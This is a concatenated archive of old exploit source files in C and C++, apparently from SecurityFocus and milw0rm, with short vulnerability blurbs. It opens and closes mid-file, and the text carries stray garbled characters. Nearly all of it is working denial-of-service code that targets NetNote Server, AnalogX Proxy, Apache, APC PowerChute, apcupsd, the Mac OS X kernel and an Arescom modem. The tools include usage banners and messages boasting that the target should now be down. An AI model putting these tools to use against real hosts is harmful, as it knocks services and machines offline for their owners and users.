�if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
�int ip=htonl(inet_addr(argv[2])), port;
�if (argc==4){port=atoi(argv[3]);}
�else port=6123;
�SOCKET s;
�struct fd_set mask;
�struct timeval timeout;
�struct sockaddr_in server;
�s=socket(AF_INET,SOCK_STREAM,0);
�if (s==INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
�server.sin_family=AF_INET;
�server.sin_addr.s_addr=htonl(ip);
�server.sin_port=htons(port);
�WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
�timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
�switch(select(s+1,NULL,&mask,NULL,&timeout))
�{
��case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
��case 0: {cout<<"[+] connect() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
��default:
��if(FD_ISSET(s,&mask))
��{
���cout<<"[+] connected, sending the bad string..."<<endl;
���Sleep(1000);
���if (atoi(argv[1]) == 1){strcat(payload,crash);}
���strcat(payload,"\r\n");
���Sleep(1000);
����� if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
���Sleep(1000);
���if (atoi(argv[1]) == 1){cout<<"[+] payload send, the NetNote server should be crashed."<<endl;}
���return 0;
��}
�}
�closesocket(s);
�WSACleanup();
�return 0;
}
�

void usage(char* us)
{�
�cout<<"USAGE: 101_netn.exe Method Ip Port\n"<<endl;
�cout<<"TARGETS:������������������������������ "<<endl;
�cout<<"����� [+] 1. Crash NetNote Server� (*)"<<endl;
�cout<<"NOTE:������������������������������ "<<endl;
�cout<<"����� The port 6123 is default if no port are specified"<<endl;
�cout<<"����� The exploit crash the server."<<endl;
�cout<<"����� A wildcard (*) mean Tested."<<endl;
�return;
}
�
void ver()
{�
cout<<endl;
cout<<"������������������������������������������������������������������ "<<endl;
cout<<"������� ===================================================[v0.1]===="<<endl;
cout<<"������� ===NetNote Server v2.2, Free Electronic Notes for Windows===="<<endl;
cout<<"������� ========Remote Crafted String Vulnerability=================="<<endl;
cout<<"������� ====coded by class101===========[DFind.kd-team.com 2004]====="<<endl;
cout<<"������� ============================================================="<<endl;
cout<<"������������������������������������������������������������������ "<<endl;
}
source: http://www.securityfocus.com/bid/1504/info

AnalogX Proxy is a simple proxy server that allows a user to connect a network of computers to the internet through the proxy gateway. Many of the services provided contain buffer overrun vulnerabilities that can allow an attacker to crash the proxy server remotely. The FTP, SMTP, POP3 and SOCKS services are vulnerable to a denial of service attack by sending especially long arguments to certain commands. 

/*

 AnalogX Proxy DoS by wildcoyote@coders-pt.org

 Accoding to bugtraq advisory....
 Bugtraq id    : 1504
 Object        : Proxy.exe (exec) 
 Class         : Boundary Condition Error 
 Cve           : GENERIC-MAP-NOMATCH 
 Remote        : Yes 
 Local         : No 
 Published     : July 25, 2000 
 Vulnerable    : AnalogX Proxy 4.4
 Not vulnerable: AnalogX Proxy 4.6
                 AnalogX Proxy 4.5

 Words: Bastards, they killed kenny!

*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>


struct analogXDoS_types {
  char *service;
  int port;
  char *command;
  int overflow_string_size;
};

struct analogXDoS_types analogXDoS_types[]={
  {"AnalogX FTP Proxy ",21,"USER BO@userfriendly.org\n",370}, 
  {"AnalogX SMTP Proxy",25,"HELO BO@userfriendly.org\n",370},
  {"AnalogX POP3 Proxy",110,"USER BO@userfriendly.org\n",370},
  {NULL,0,NULL,0}
};



int
openhost(char *host,int port) {
   int sock;
   struct sockaddr_in addr;
   struct hostent *he;
   he=gethostbyname(host);
   if (he==NULL) return -1;
   sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
   if (sock==-1) return -1;
   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);
   if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) sock=-1;
   return sock;
}

void
sends(int sock,char *buf) {
  write(sock,buf,strlen(buf));
}

void
analogXcrash(char *host, int type)
{
 char *buf;
 int sock, i, x, buffer_size;
 printf("Type Number: %d\n",type);
 printf("Service    : %s\n",analogXDoS_types[type].service);
 printf("Port       : %d\n",analogXDoS_types[type].port);
 printf("Let the show begin ladyes...\n");
 printf("Connecting to %s [%d]...",host,analogXDoS_types[type].port);
 sock=openhost(host,analogXDoS_types[type].port);
 if (sock==-1)
 {
  printf("FAILED!\n");
  printf("Couldnt connect...leaving :|\n\n");
  exit(-1);
 }
 printf("SUCCESS!\n");
 printf("Allocating memory for buffer...");
 buffer_size=(strlen(analogXDoS_types[type].command)
             +
             analogXDoS_types[type].overflow_string_size);
 if (!(buf=malloc(buffer_size)))
 {
  printf("FAILED!\n");
  printf("Leaving... :[\n\n");
  exit(-1);
 }
 printf("WORKED! (heh)\n");
 for(i=0;;i++)
  if ((analogXDoS_types[type].command[i]=='B') &&
      (analogXDoS_types[type].command[i+1]=='O')) break;
  else buf[i]=analogXDoS_types[type].command[i];
 for(x=0;x<analogXDoS_types[type].overflow_string_size;x++) strcat(buf,"X");
 i+=2;
 for(;i<strlen(analogXDoS_types[type].command);i++)
    buf[strlen(buf)]=analogXDoS_types[type].command[i];
 printf("Sending EVIL buffer ;)\n");
 sends(sock,buf);
 close(sock);
 printf("Heh...that host should be a gonner by now ;)\n");
 printf("Was it good for you to? :)\n\n");
}

void
show_types()
{
 int i;
 for(i=0;;i++)
 {
  if (analogXDoS_types[i].service==NULL) break;
  printf("Type Number: %d\nService : %s Port : %d Overflow string size : %d\n",i
        ,analogXDoS_types[i].service
        ,analogXDoS_types[i].port
        ,analogXDoS_types[i].overflow_string_size);
 }
}

main(int argc, char *argv[])
{
 int i;
 // lets keep on (int) var i the number of types ;)
 for(i=0;;i++) if (analogXDoS_types[i].service==NULL) break;
 i--; // oh my god, cant forget that'array[0] thingie! :))
 printf("\n\t\tAnalogX Proxy v4.4 DoS by wildcoyote@coders-pt.org\n\n");
 if (argc<3) {
    printf("Sintaxe: %s <host> <type number> [port]\n",argv[0]);
    show_types();
    printf("\n*Enjoy*...\n\n");
 }
 else if (atoi(argv[2])<=i)
       if (argc==3) analogXcrash(argv[1],atoi(argv[2]));
       else {
           analogXDoS_types[atoi(argv[2])].port=atoi(argv[3]);
           analogXcrash(argv[1],atoi(argv[2]));
       }
      else
      {
        printf("Invalid type value (max type=%d)\n",i);
        printf("Type %s for more information :)\n\n",argv[0]);
      }
}
source: http://www.securityfocus.com/bid/5787/info

Apache is prone to a denial of service condition when an excessive amount of data is written to stderr. This condition reportedly occurs when the amount of data written to stderr is over the default amount allowed by the operating system.

This may potentially be an issue in web applications that write user-supplied data to stderr. Additionally, locally based attackers may exploit this issue. 

This issue has been confirmed in Apache 2.0.39/2.0.40 on Linux operating systems. Apache on other platforms may also be affected. This issue does not appear to be present in versions prior to 2.0.x.

// Credit to: K.C. Wong
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>

#define SIZE 4075

void out_err()
{
        char buffer[SIZE];
        int i = 0;

        for (i = 0; i < SIZE - 1; ++i)
                buffer[i] = 'a' + (char )(i % 26);

        buffer[SIZE - 1] = '\0';

//
fcntl(2, F_SETFL, fcntl(2, F_GETFL) | O_NONBLOCK);

        fprintf(stderr, "short test\n");
        fflush(stderr);

        fprintf(stderr, "test error=%s\n", buffer);
        fflush(stderr);
} // out_err()

int main(int argc, char ** argv)
{
        fprintf(stdout, "Context-Type: text/html\r\n");
        fprintf(stdout, "\r\n\r\n");
        out_err();
        fprintf(stdout, "<HTML>\n");
        fprintf(stdout, "<body>\n");
        fprintf(stdout, "<h1>hello world</h1>\n");
        fprintf(stdout, "</body>\n");
        fprintf(stdout, "</HTML>\n");
        fflush(stdout);
        exit(0);
} // main()/******** th-apachedos.c ********************************************************
* *
* Remote Apache DoS exploit *
* ------------------------- *
* Written as a poc for the: *
* 
* This program sends 8000000 \n's to exploit the Apache memory leak. *
* Works from scratch under Linux, as opposed to apache-massacre.c . *
* 
* 
* Daniel Nyström <exce@netwinder.nu> *
* 
* - www.telhack.tk - *
* 
******************************************************** th-apachedos.c ********/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>


int main(int argc, char *argv[])
{
int sockfd;
int count;
char buffer[8000000];
struct sockaddr_in target;
struct hostent *he;

if (argc != 3)
{
fprintf(stderr, "\nTH-apachedos.c - Apache <= 2.0.44 DoS exploit.");
fprintf(stderr, "\n----------------------------------------------");
fprintf(stderr, "\nUsage: %s <Target> <Port>\n\n", argv[0]);
exit(-1);
}

printf("\nTH-Apache DoS\n");
printf("-------------\n");
printf("-> Starting...\n"); 
printf("->\n");

// memset(buffer, '\n', sizeof(buffer)); /* testing */

for (count = 0; count < 8000000;) 
{
buffer[count] = '\r'; /* 0x0D */
count++;
buffer[count] = '\n'; /* 0x0A */
count++;
}

if ((he=gethostbyname(argv[1])) == NULL)
{
herror("gethostbyname() failed ");
exit(-1);
}

memset(&target, 0, sizeof(target));
target.sin_family = AF_INET;
target.sin_port = htons(atoi(argv[2]));
target.sin_addr = *((struct in_addr *)he->h_addr);

printf("-> Connecting to %s:%d...\n", inet_ntoa(target.sin_addr), atoi(argv[2]));
printf("->\n");

if ((sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
{
perror("socket() failed ");
exit(-1);
}

if (connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) < 0)
{
perror("connect() failed ");
exit(-1);
}

printf("-> Connected to %s:%d... Sending linefeeds...\n", inet_ntoa(target.sin_addr),
atoi(argv[2]));
printf("->\n");

if (send(sockfd, buffer, strlen(buffer), 0) != strlen(buffer))
{
perror("send() failed ");
exit(-1);
close(sockfd);
} 


close(sockfd);

printf("-> Finished smoothly, check hosts apache...\n\n");
}

// milw0rm.com [2003-04-11]
/*
 * This is a reverse engineered version of the exploit for CVE-2011-3192 made
 * by ev1lut10n (http://jayakonstruksi.com/backupintsec/rapache.tgz).
 * Copyright 2011 Ramon de C Valle <rcvalle@redhat.com>
 *
 * Compile with the following command:
 * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <pthread.h>

void ptrace_trap(void) __attribute__ ((constructor));

void
ptrace_trap(void) {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
        write(fileno(stdout), "Segmentation fault\n", 19);
        exit(-1);
    }
}

void
w4rn41dun14mu(int attr, int fg, int bg)
{
    char command[13];

    sprintf(command, "%c[%d;%d;%dm", 0x1b, attr, fg+30, bg+40);
    printf("%s", command);
}

void
banner()
{
    w4rn41dun14mu(0, 1, 0);
    fwrite("Remote Apache Denial of Service Exploit by ev1lut10n\n", 53, 1,
           stdout);
}

void
gime_er_mas()
{
    printf("%c%s", 0x1b, "[2J");
    printf("%c%s", 0x1b, "[1;1H");
    puts("\nsorry dude there's an error...");
}

struct thread_info {
    pthread_t thread_id;
    int       thread_num;
    char     *argv_string;
};

static void *
thread_start(void *arg)
{
    struct thread_info *tinfo = (struct thread_info *) arg;
    char hostname[64];
    int j;

    strcpy(hostname, tinfo->argv_string);

    j = 0;
    while (j != 10) {
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int sfd, s;
        ssize_t nwritten;

        memset(&hints, 0, sizeof(struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = 0;
        hints.ai_protocol = 0;

        s = getaddrinfo(hostname, "http", &hints, &result);
        if (s != 0) {
            fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
            exit(EXIT_FAILURE);
        }

        for (rp = result; rp != NULL; rp = rp->ai_next) {
            sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
            if (sfd == -1)
                continue;

            if (connect(sfd, rp->ai_addr, rp->ai_addrlen) == -1)
                close(sfd);
        }

        if (result != NULL)
            freeaddrinfo(result);

        nwritten = write(sfd, "HEAD / HTTP/1.1\n"
                              "Host:localhost\n"
                              "Range:bytes=0-,0-\n"
                              "Accept-Encoding: gzip", 71);
        if (nwritten == -1)
            close(sfd);

        usleep(300000);

        j++;
    }

    return 0;
}

int
main(int argc, char *argv[])
{
    int i;
    struct thread_info tinfo;

    banner();

    if (argc <= 1) {
        w4rn41dun14mu(0, 2, 0);
        fwrite("\n[-] Usage : ./rapache hostname\n", 32, 1, stdout);
        return 0;
    }

    w4rn41dun14mu(0, 3, 0);
    printf("[+] Attacking %s please wait  in minutes ...\n", argv[1]);

    while (1) {
        i = 0;
        while (i != 50) {
            tinfo.thread_num = i;
            tinfo.argv_string = argv[1];

            pthread_create(&tinfo.thread_id, NULL, &thread_start, &tinfo);

            usleep(500000);

            i++;
        }
    }
}
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>

#define A 0x41
#define PORT 80

struct sockaddr_in hrm;

int conn(char *ip)
{
int sockfd;
hrm.sin_family = AF_INET;
hrm.sin_port = htons(PORT);
hrm.sin_addr.s_addr = inet_addr(ip);
bzero(&(hrm.sin_zero),8);
sockfd=socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr*)&hrm,sizeof(struct sockaddr)))<0)
{
perror("connect");
exit(0);
}
return sockfd;
}
int main(int argc, char *argv[])
{
int i,x;
char buf[300],a1[8132],a2[50],host[100],content[100];
char *ip=argv[1],*new=malloc(sizeof(int));
sprintf(new,"\r\n");
memset(a1,'\0',8132);
memset(host,'\0',100);
memset(content,'\0',100);
a1[0] = ' ';
for(i=1;i<8132;i++)
a1[i] = A;
if(argc<2)
{
printf("%s: IP\n",argv[0]);
exit(0);
}
x = conn(ip);
printf("[x] Connected to: %s.\n",inet_ntoa(hrm.sin_addr));
sprintf(host,"Host: %s\r\n",argv[1]);
sprintf(content,"Content-Length: 50\r\n");
sprintf(buf,"GET / HTTP/1.0\r\n");
write(x,buf,strlen(buf));
printf("[x] Sending buffer...");
for(i=0;i<2000;i++)
{
write(x,a1,strlen(a1));
write(x,new,strlen(new));
}
memset(buf,'\0',300);
strcpy(buf,host);
strcat(buf,content);
for(i=0;i<50;i++)
a2[i] = A;
strcat(buf,a2);
strcat(buf,"\r\n\r\n");
write(x,buf,strlen(buf));
printf("done!\n");
close(x);

}

// milw0rm.com [2004-08-02]
source: http://www.securityfocus.com/bid/83/info

APC PowerChute PLUS is a software package that will safely shutdown computer systems locally or accross a network when UPS power starts to fail. When operating PowerChute PLUS normally listens to TCP ports 6547 and 6548, as well as for broadcast requests in UDP port 6549.

A request packet can be craftted and sent to the UDP port such that the upsd server will crash. This is been tested in the Solaris i386 version of the product.

It has also been reported the software will crash in some instances when port scanned.

It seems you can also manage any APC UPS remotely without providing any credential if you have the APC client software.

Both the client and server software also create files insecurely in /tmp. The pager script (dialpager.sh) also contains unsafe users of temporary files. The mailer script (mailer.sh) passes the files provided in the command line to rm without checking them.

----- begin downupsd.c -----
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

int main(int argc, char **argv) {
int s;
long on=1;
size_t addrsize;
char buffer[256];
struct sockaddr_in toaddr, fromaddr;
struct hostent h_ent;

if(argc!=2) {
fprintf(stderr, "Usage:\n\t%s <hostname running upsd>\n", argv[0]);
exit(0);
}
s = socket(AF_INET,SOCK_DGRAM,0);
setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on));

printf("Crashing upsd on host's subnet: %s\n", argv[1]);

toaddr.sin_family = AF_INET;
toaddr.sin_port = htons(0);
toaddr.sin_addr.s_addr = 0x00000000;
bind(s, (struct sockaddr *)&toaddr, sizeof(struct sockaddr_in));
toaddr.sin_port = htons(6549);
memcpy((char *)&h_ent, (char *)gethostbyname(argv[1]), sizeof(h_ent));
memcpy(&toaddr.sin_addr.s_addr, h_ent.h_addr, sizeof(struct in_addr));
toaddr.sin_addr.s_addr |= 0xff000000;
strcpy(buffer, "027|1|public|9|0|0|2010~|0\0");
sendto(s, buffer, 256, 0, (struct sockaddr *)&toaddr,
sizeof(struct sockaddr_in));

printf("Crashed...\n");
close(s);

}
------- end downupsd.c -----/* Local Denial of Service for any linux box running APCUPSD v3.7.2 
 *
 * APCUPSD has his pid file world writeable, therefore it is possible
 * to let it kill another pid and create a denial of service against any
 * running daemon. (when the apcupsd is stopped, for example)
 *
 * Bug discovered by: Mattias Dartsch <matze@joonix.de>
 * Exploit code by: The Itch / BsE 
 *
 * Greets fly out to: Tasc, C-Murdah, Calimonk, Zer0, Tozz, Pyra, 
 * Shadowlady, Wildcoyote, Lucipher, Zephyr, ph33r-the-b33r and aiko
 */
 
#include <stdio.h>

#define PIDFILE "/var/run/apcupsd.pid"

/* pid file definition (processes that you can choose from to crash)
 * these pid files and their paths came from a redhat distribution
 */

#define HTTPDPID "/var/run/httpd.pid"
#define SYSLOGDPID "/var/run/syslogd.pid"
#define CRONDPID "/var/run/crond.pid"
#define KLOGDPID "/var/run/klogd.pid"
#define INETDPID "/var/run/inetd.pid"
#define IDENTDPID "/var/run/identd.pid"
#define SENDMAILPID "/var/run/sendmail.pid"

int dosusage(char *apcfilename)
{
	printf("----------------------------\n");
	printf("\nUsage: %s <number>\n", apcfilename);
	printf("where number is either:\n");
	printf("1. crash linux\n");
	printf("2. crash httpd\n");
	printf("3. crash klogd\n");
	printf("4. crash crond\n");
	printf("5. crash syslogd\n");
	printf("6. crash inetd\n");
	printf("7. crash indentd\n");
	printf("8. crash sendmaild\n\n");	
	return 0;
}

int main(int argc, char **argv)
{
	FILE *apcpid;
	FILE *dospidfile;
	char *dospid[5];
	int dosarg;

	printf("\nAPCUPSD can be used to crash any linux distribution\n");
	printf("or any other pid running at that moment when apcupsd is\n");
 	printf("stopped or when it gets normally killed using its pid.\n");
	printf("\nCoded by The Itch / Bse\n\n");

	if(argc < 2) { dosusage(argv[0]); exit(0); }
	if(atoi(argv[1]) > 8) { dosusage(argv[0]); exit(0); }
	dosarg = atoi(argv[1]);

	apcpid = fopen(PIDFILE, "r");
	if(!apcpid)
	{
		printf("%s does not exist\n\n", PIDFILE);
		exit(1);
	}
	fclose(apcpid);

	apcpid = fopen(PIDFILE, "w");

	if(dosarg == 1)
	{
		/* crash entire linux */
		fprintf(apcpid, "1");
	}
	if(dosarg == 2)
	{
		/* crash httpd */
		dospidfile = fopen(HTTPDPID, "r");
		fgets(dospid[4], 4, dospidfile);		
		fclose(dospidfile);				
		fprintf(apcpid, dospid[4]);
	}
	if(dosarg == 3)
	{
		/* crash klogd */
		dospidfile = fopen(KLOGDPID, "r");
		fgets(dospid[4], 4, dospidfile);
		fclose(dospidfile);
		fprintf(apcpid, dospid[4]);
	}
	if(dosarg == 4)
	{
		/* crash crond */
		dospidfile = fopen(CRONDPID, "r");
		fgets(dospid[4], 4, dospidfile);
		fclose(dospidfile);
		fprintf(apcpid, dospid[4]);
	}
	if(dosarg == 5)
	{
		/* crash syslogd */
		dospidfile = fopen(SYSLOGDPID, "r");
		fgets(dospid[4], 4, dospidfile);
		fclose(dospidfile);
		fprintf(apcpid, dospid[4]);
	}
	if(dosarg == 6)
	{
		/* crash inetd */
		dospidfile = fopen(INETDPID, "r");
		fgets(dospid[4], 4, dospidfile);
		fclose(dospidfile);
		fprintf(apcpid, dospid[4]);
	}
	if(dosarg == 7)
	{
		/* crash identd */
		dospidfile = fopen(IDENTDPID, "r");
		fgets(dospid[4], 4, dospidfile);
		fclose(dospidfile);
		fprintf(apcpid, dospid[4]);
	}
	if(dosarg == 8)
	{
		/* crash sendmail */
		dospidfile = fopen(SENDMAILPID, "r");
		fgets(dospid[4], 4, dospidfile);
		fclose(dospidfile);
		fprintf(apcpid, dospid[4]);
	}
	
	fclose(apcpid);
	printf("DoS activated, its now a matter of time until apcupsd gets\n");
	printf("restarted or stopped....\n\n");
	
	return 0;
}



// milw0rm.com [2001-01-15]
source: http://www.securityfocus.com/bid/36915/info

Apple Mac OS X is prone to a local denial-of-service vulnerability that is caused by a race condition.

Exploiting this issue allows local, unprivileged users to crash affected kernels, denying further service to legitimate users. 

/*
  Mac OS X 10.5.6/10.5.7 ptrace() mutex handling DoS 
  ==================================================
  This code should be run in a loop and due to problems 
  with mutex handling in ptrace a DoS can occur when a 
  destroyed mutex is attempted to be interlocked by OSX 
  kernel giving rise to a race condition. You may need
  to run this code multiple times.
  
  - Tested against 10.5.6
  - Tested against 10.5.7

  while `true`;do ./prdelka-vs-APPLE-ptracepanic;done

  This code is dedicated to a friend who I met in this
  place. Long live the exploit scene. R.I.P str0ke.

  -- prdelka
*/
#include <sys/types.h>
#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>


int main(){
	pid_t pid;
	char *argv[] = {"id","","",0};
	char *envp[] = {"",0};
	pid = fork();
	if(pid == 0){
		usleep(100);
		execve("/usr/bin/id",argv,envp);
	}
	else{
		usleep(820);
		if(ptrace(PT_ATTACH,pid,0,0)==0){
			printf("[ PID: %d has been caught!\n",pid);
			if(ptrace(PT_DETACH,pid,0,0)<0){
				perror("Evil happens.");
			}
			usleep(1);
			wait(0);
			}
		else{
			perror("Fail!");
		}
	}
	return(0);
}

source: http://www.securityfocus.com/bid/20982/info

Apple Mac OS X is prone to a local denial-of-service vulnerability because the kernel fails to properly handle the execution of a system call.

Exploiting this issue allows local, unprivileged users to crash affected kernels, denying further service to legitimate users.

#include <unistd.h>
#include <semaphore.h>

int main() {
fpathconf(sem_open("DaringWussball", O_CREAT, S_IRWXU, 1), 0);
}/* xnu-macho-dos.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * Apple MACOS X xnu <= 1228.0 local kernel DoS POC
 * by mu-b - Thu 15 Nov 2007
 *
 * - Tested on: Apple MACOS X 10.4 (xnu-792.22.5~1/RELEASE_I386)
 *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_PPC)
 *
 * integer overflow causes infinite loop in load_threadstack.
 *                                    (bsd/kern/mach_loader.c)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define MAX_PATH_LEN        128

#define LC_UNIXTHREAD       0x05
#define x86_THREAD_STATE32  0x01

/* osfmk/mach-o/loader.h */
struct thread_command {
  unsigned long cmd;            /* LC_THREAD or LC_UNIXTHREAD */
  unsigned long cmdsize;        /* total size of this command */
  unsigned long flavor;         /* flavor of thread state */
  unsigned long count;          /* count of longs in thread state */
};

static void *
xmalloc (int num_bytes)
{
  char *buf;

  buf = malloc (num_bytes);
  if (buf == NULL)
    {
      fprintf (stderr, "malloc (): out of memory allocating %d-bytes!\n", num_bytes);
      exit (EXIT_FAILURE);
    }

  return (buf);
}

int
main (int argc, char ** argv)
{
  char fnbuf[MAX_PATH_LEN], *ptr, *cur, *end;
  int fd, wfd, found, size;
  struct stat fbuf;

  printf ("Apple MACOS X xnu <= 1228.0 local kernel DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <macho-o binary>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if ((fd = open (argv[1], O_RDONLY)) == -1)
    {
      perror ("open ()");
      exit (EXIT_FAILURE);
    }

  snprintf (fnbuf, sizeof fnbuf, "%s-pown", argv[1]);

  if ((wfd = open (fnbuf, O_RDWR | O_CREAT)) == -1)
    {
      perror ("open ()");
      exit (EXIT_FAILURE);
    }

  if (fstat (fd, &fbuf) < 0)
    {
      perror ("fstat ()");
      exit (EXIT_FAILURE);
    }

  size = fbuf.st_size;
  ptr = xmalloc (sizeof (char) * size);
  end = ptr + size;

  if (read (fd, ptr, size) < size)
    {
      unlink (fnbuf);

      perror ("write ()");
      exit (EXIT_FAILURE);
    }

  close (fd);

  for (cur = ptr, found = 0;
       !found && cur + sizeof (struct thread_command) < end;
       cur += sizeof (unsigned long))
    {
      struct thread_command *thr_cmd;

      thr_cmd = (struct thread_command *) cur;
      if (thr_cmd->cmd == LC_UNIXTHREAD &&
          thr_cmd->flavor == x86_THREAD_STATE32)
        {
          thr_cmd->count = 0x3FFFFFFE;
          printf ("* found at offset @0x%08X\n", cur - ptr);
          found = 1;
        }
    }

  if (!found)
    {
      unlink (fnbuf);

      fprintf (stderr, "* ARGH! hueristic didn't find our target!\n");
      exit (EXIT_FAILURE);
    }

  write (wfd, ptr, size);
  fchmod(wfd, fbuf.st_mode);
  close (wfd);

  free (ptr);
  fprintf (stdout, "* done\nexecute ./%s at your own risk!$%%!\n", fnbuf);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-12-04]
/*
    Do you want to hack? les`t go .. free your mind
    Tu veux etre un hacker? allez .. if faut libere ta tete!
    Quieres hackear? dale .. libera tu mente
    
    Vulnerabilidad en modem Arescom NetDSL-1000 
    por un buffer overflow debido < [255] en la pila stack.
    
    DoS atack por Fabian Ramirez S. <framirez@akori.fr>	
						www.framirez.com


	  If you flood the telnet configuration a couple dozen times with long
	strings, eventually the telnetd service flat out dies. Routing functions
	of the NetDSL continue to work fine as before. It is unknown whether only
	the telnetd service is affected, other means of remote configuration may
	have become unavailable as well.

	Remember:   KING
    
    Solo para fines educativos! (CREEEEEEO ZEEEEEEEEEEE)
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>        

#define PORT 23
#define MAXDATASIZE 100   

char shellcode[]= "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1";

int main(int argc, char *argv[])
{
   int fd, numbytes,i;
   char buf[MAXDATASIZE];  
   struct hostent *he;         
   struct sockaddr_in server;  

   printf("Exploit Arescom NetDSL-1000 executing\n");
   printf ("	 		  by framirez\n");
   
   if (argc !=2) { 
      printf("Uso: %s <Dirección IP>\n",argv[0]);
      exit(-1);
   }


    
   if ((he=gethostbyname(argv[1]))==NULL){       
      printf("gethostbyname() error\n");
      exit(-1);
   }

   if ((fd=socket(AF_INET, SOCK_STREAM, 0))==-1){  
      printf("socket() error\n");
      exit(-1);
   }

   server.sin_family = AF_INET;
   server.sin_port = htons(PORT); 
   server.sin_addr = *((struct in_addr *)he->h_addr);  

   if(connect(fd, (struct sockaddr *)&server,
      sizeof(struct sockaddr))==-1){ 
      printf("ERROR conectando al host\n");
      exit(-1);
   }
      
    for (i=0;i<3;i++)
    {
    send(fd,shellcode,255,0);
    }
    
    printf ("Exploit enviado con EXITO al destinatario\n");
    printf ("				   by framirez\n");

   close(fd); 

  return 1;
}

// milw0rm.com [2006-02-02]
 /*
  ArGoSoft Ftp Server remote overflow exploit
  author : c0d3r "kaveh razavi" c0d3rz_team@yahoo.com c0d3r@ihsteam.com
  package : ArGoSoft 1.4.2.29 and prior 
  advisory : packetstormsecurity.nl/0503-advisories/argosoftFTP1428.txt
  company address : argosoft.com
  the bug was found by a mate and reported to argosoft and they released
  another version . I downloaded the patched ver at www.argosoft.com
  and started to test the server . I saw that they worked with the vul 
  but they didnt solve the mentioned DELE overflow . he did a wise job
  every long char which would be send to server it will write a nullbyte 
  in the middle so we cant overwrite eip or other registers normally .
  The eip would be overwrite like 00410041 which seems useless . the server
